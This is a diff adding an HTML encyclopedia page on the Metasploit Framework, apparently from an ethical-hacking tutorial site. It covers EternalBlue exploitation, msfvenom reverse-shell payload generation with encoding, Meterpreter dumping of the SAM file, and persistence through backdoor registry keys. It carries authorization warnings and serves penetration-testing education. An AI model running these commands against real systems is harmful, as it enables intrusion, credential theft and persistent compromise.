@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework - Penetration Testing Platform | HackBox.Space</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%232563eb'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/></svg>">
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <a href="../index.html" style="text-decoration: none; color: inherit;">
+                        <h1>HackBox.Space</h1>
+                        <span>Ethical Hacking Tools Encyclopedia</span>
+                    </a>
+                </div>
+                <div class="search-container">
+                    <input type="text" id="searchInput" placeholder="Search tools..." class="search-input">
+                    <div id="searchResults" class="search-results"></div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="wiki-header">
+        <div class="container">
+            <div class="breadcrumb">
+                <a href="../index.html">Home</a> > <a href="../index.html#exploitation">Exploitation Frameworks</a> > Metasploit
+            </div>
+            <h1 class="wiki-title">Metasploit Framework</h1>
+            <p class="wiki-subtitle">The world's most used penetration testing framework</p>
+        </div>
+    </div>
+
+    <main class="main">
+        <div class="container">
+            <div class="wiki-content">
+                <div class="content-main">
+                    <h2>Overview</h2>
+                    <p>The Metasploit Framework is the world's most used penetration testing framework. Developed by Rapid7, it provides information about security vulnerabilities and aids in penetration testing and IDS signature development. The framework includes a suite of tools that can be used to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.</p>
+
+                    <div class="info-box">
+                        <h4>Key Information</h4>
+                        <ul>
+                            <li><strong>Developer:</strong> Rapid7 (originally H.D. Moore)</li>
+                            <li><strong>License:</strong> BSD-3-Clause</li>
+                            <li><strong>Platform:</strong> Cross-platform (Linux, Windows, macOS)</li>
+                            <li><strong>Language:</strong> Ruby</li>
+                            <li><strong>First Release:</strong> 2003</li>
+                        </ul>
+                    </div>
+
+                    <h2>Editions</h2>
+                    <ul>
+                        <li><strong>Community Edition (Free):</strong> Open-source framework with basic features</li>
+                        <li><strong>Pro Edition:</strong> Commercial version with GUI, advanced features, and support</li>
+                        <li><strong>Express Edition:</strong> Free web-based version with limited features</li>
+                    </ul>
+
+                    <h2>Core Components</h2>
+
+                    <h3>msfconsole</h3>
+                    <p>The main command-line interface for interacting with the framework.</p>
+                    <div class="code-block">
+                        <pre># Start Metasploit console
+msfconsole
+
+# Basic commands
+msf6 > help
+msf6 > version
+msf6 > banner</pre>
+                    </div>
+
+                    <h3>Exploits</h3>
+                    <p>Code that takes advantage of security vulnerabilities.</p>
+                    <div class="code-block">
+                        <pre># Search for exploits
+msf6 > search type:exploit platform:windows
+
+# Use specific exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# Show exploit information
+msf6 exploit(windows/smb/ms17_010_eternalblue) > info
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options</pre>
+                    </div>
+
+                    <h3>Payloads</h3>
+                    <p>Code that runs after successful exploitation.</p>
+                    <div class="code-block">
+                        <pre># List available payloads
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+
+# Set payload
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+
+# Generate standalone payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe</pre>
+                    </div>
+
+                    <h3>Auxiliaries</h3>
+                    <p>Support modules for scanning, fuzzing, and gathering information.</p>
+                    <div class="code-block">
+                        <pre># Port scanning
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+# SMB scanning
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/smb/smb_version) > run</pre>
+                    </div>
+
+                    <h3>Post-exploitation Modules</h3>
+                    <p>Modules for maintaining access and gathering information post-compromise.</p>
+
+                    <h2>Common Attack Workflows</h2>
+
+                    <h3>Basic Exploitation</h3>
+                    <div class="code-block">
+                        <pre># Step 1: Information gathering
+nmap -sV 192.168.1.100
+
+# Step 2: Search for relevant exploits
+msf6 > search ms17-010
+
+# Step 3: Configure exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
+
+# Step 4: Execute exploit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit</pre>
+                    </div>
+
+                    <h3>Meterpreter Usage</h3>
+                    <div class="code-block">
+                        <pre># Basic Meterpreter commands
+meterpreter > help
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > ps
+meterpreter > pwd
+meterpreter > ls
+
+# File operations
+meterpreter > download C:\\Windows\\System32\\config\\SAM
+meterpreter > upload /tmp/backdoor.exe C:\\temp\\
+
+# Process manipulation
+meterpreter > migrate 1234
+meterpreter > getpid
+
+# Network commands
+meterpreter > ipconfig
+meterpreter > netstat
+meterpreter > route
+
+# Privilege escalation
+meterpreter > getsystem
+meterpreter > getprivs</pre>
+                    </div>
+
+                    <h3>Persistence</h3>
+                    <div class="code-block">
+                        <pre># Establish persistence
+meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.1.50
+
+# Create backdoor
+meterpreter > run metsvc
+
+# Add registry key
+meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d "C:\\backdoor.exe"</pre>
+                    </div>
+
+                    <h2>Advanced Features</h2>
+
+                    <h3>Multi-handler</h3>
+                    <div class="code-block">
+                        <pre># Set up listener for reverse connections
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.50
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit -j</pre>
+                    </div>
+
+                    <h3>Database Integration</h3>
+                    <div class="code-block">
+                        <pre># Initialize database
+msfdb init
+
+# Database commands
+msf6 > db_status
+msf6 > workspace
+msf6 > workspace -a target_company
+msf6 > db_nmap -sV 192.168.1.0/24
+msf6 > hosts
+msf6 > services
+msf6 > vulns</pre>
+                    </div>
+
+                    <h3>Pivoting and Routing</h3>
+                    <div class="code-block">
+                        <pre># Add route through compromised host
+meterpreter > run autoroute -s 10.0.0.0/8
+meterpreter > background
+
+# Set up SOCKS proxy
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set VERSION 4a
+msf6 auxiliary(server/socks_proxy) > run -j
+
+# Port forwarding
+meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.50</pre>
+                    </div>
+
+                    <h2>MSFVenom</h2>
+                    <p>Standalone payload generator and encoder.</p>
+                    <div class="code-block">
+                        <pre># List payloads
+msfvenom -l payloads
+
+# Generate Windows executable
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
+
+# Generate Linux payload
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
+
+# Generate web payload
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
+
+# Encode payload
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=192.168.1.100 LPORT=4444 -f exe > encoded.exe</pre>
+                    </div>
+
+                    <h2>Popular Modules</h2>
+
+                    <h3>Windows Exploits</h3>
+                    <ul>
+                        <li><strong>ms17_010_eternalblue:</strong> SMB vulnerability (WannaCry)</li>
+                        <li><strong>ms08_067_netapi:</strong> Classic Windows vulnerability</li>
+                        <li><strong>ms14_058_track_popup_menu:</strong> Privilege escalation</li>
+                        <li><strong>ms16_032_secondary_logon_handle_privesc:</strong> Local privilege escalation</li>
+                    </ul>
+
+                    <h3>Web Application Exploits</h3>
+                    <ul>
+                        <li><strong>tomcat_mgr_upload:</strong> Tomcat manager exploitation</li>
+                        <li><strong>struts2_content_type_ognl:</strong> Apache Struts2 RCE</li>
+                        <li><strong>drupal_drupalgeddon2:</strong> Drupal RCE vulnerability</li>
+                        <li><strong>wp_admin_shell_upload:</strong> WordPress admin shell upload</li>
+                    </ul>
+
+                    <h3>Auxiliary Scanners</h3>
+                    <ul>
+                        <li><strong>smb_version:</strong> SMB version detection</li>
+                        <li><strong>ssh_login:</strong> SSH brute force</li>
+                        <li><strong>mysql_login:</strong> MySQL brute force</li>
+                        <li><strong>vnc_login:</strong> VNC password cracking</li>
+                    </ul>
+
+                    <div class="warning">
+                        <h4>⚠️ Legal and Ethical Considerations</h4>
+                        <p>Metasploit is an extremely powerful framework that should only be used in authorized environments. Using these tools without explicit permission is illegal and unethical. Always ensure you have proper authorization before conducting penetration tests, and follow responsible disclosure practices for any vulnerabilities discovered.</p>
+                    </div>
+
+                    <h2>Best Practices</h2>
+                    <ol>
+                        <li><strong>Always get written authorization</strong> before testing</li>
+                        <li><strong>Use workspaces</strong> to organize different engagements</li>
+                        <li><strong>Document everything</strong> for reporting purposes</li>
+                        <li><strong>Update regularly</strong> to get latest exploits and patches</li>
+                        <li><strong>Test in isolated environments</strong> first</li>
+                        <li><strong>Understand the exploits</strong> you're using</li>
+                        <li><strong>Follow responsible disclosure</strong> for findings</li>
+                        <li><strong>Clean up after testing</strong> to avoid leaving artifacts</li>
+                    </ol>
+
+                    <h2>Integration with Other Tools</h2>
+                    <ul>
+                        <li><strong>Nmap:</strong> Import scan results for targeted exploitation</li>
+                        <li><strong>Nessus:</strong> Vulnerability scanning integration</li>
+                        <li><strong>Burp Suite:</strong> Web application testing workflow</li>
+                        <li><strong>Cobalt Strike:</strong> Advanced red team operations</li>
+                        <li><strong>Empire:</strong> Post-exploitation framework integration</li>
+                    </ul>
+
+                    <h2>Learning Resources</h2>
+                    <ul>
+                        <li><strong>Metasploit Unleashed:</strong> Free online course by Offensive Security</li>
+                        <li><strong>Rapid7 Documentation:</strong> Official guides and tutorials</li>
+                        <li><strong>Vulnhub/TryHackMe:</strong> Practice environments</li>
+                        <li><strong>OSCP/OSWP:</strong> Professional certifications</li>
+                        <li><strong>DefCon/BSides:</strong> Security conferences with workshops</li>
+                    </ul>
+                </div>
+
+                <div class="sidebar">
+                    <h3>Quick Navigation</h3>
+                    <ul>
+                        <li><a href="#overview">Overview</a></li>
+                        <li><a href="#components">Core Components</a></li>
+                        <li><a href="#workflows">Attack Workflows</a></li>
+                        <li><a href="#advanced">Advanced Features</a></li>
+                        <li><a href="#best-practices">Best Practices</a></li>
+                    </ul>
+
+                    <h3>Related Tools</h3>
+                    <ul>
+                        <li><a href="beef.html">BeEF</a></li>
+                        <li><a href="set.html">SET</a></li>
+                        <li><a href="empire.html">Empire</a></li>
+                        <li><a href="covenant.html">Covenant</a></li>
+                    </ul>
+
+                    <h3>Categories</h3>
+                    <ul>
+                        <li><a href="../index.html#exploitation">Exploitation Frameworks</a></li>
+                        <li><a href="../index.html#postexploit">Post-Exploitation</a></li>
+                    </ul>
+
+                    <div class="info-box">
+                        <h4>Quick Stats</h4>
+                        <ul>
+                            <li><strong>Difficulty:</strong> High</li>
+                            <li><strong>Platform:</strong> Cross-platform</li>
+                            <li><strong>Cost:</strong> Free/Commercial</li>
+                            <li><strong>Learning Curve:</strong> Steep</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 HackBox.Space - Educational purposes only. Always follow ethical hacking guidelines.</p>
+        </div>
+    </footer>
+
+    <script src="../script.js"></script>
+</body>
+</html>
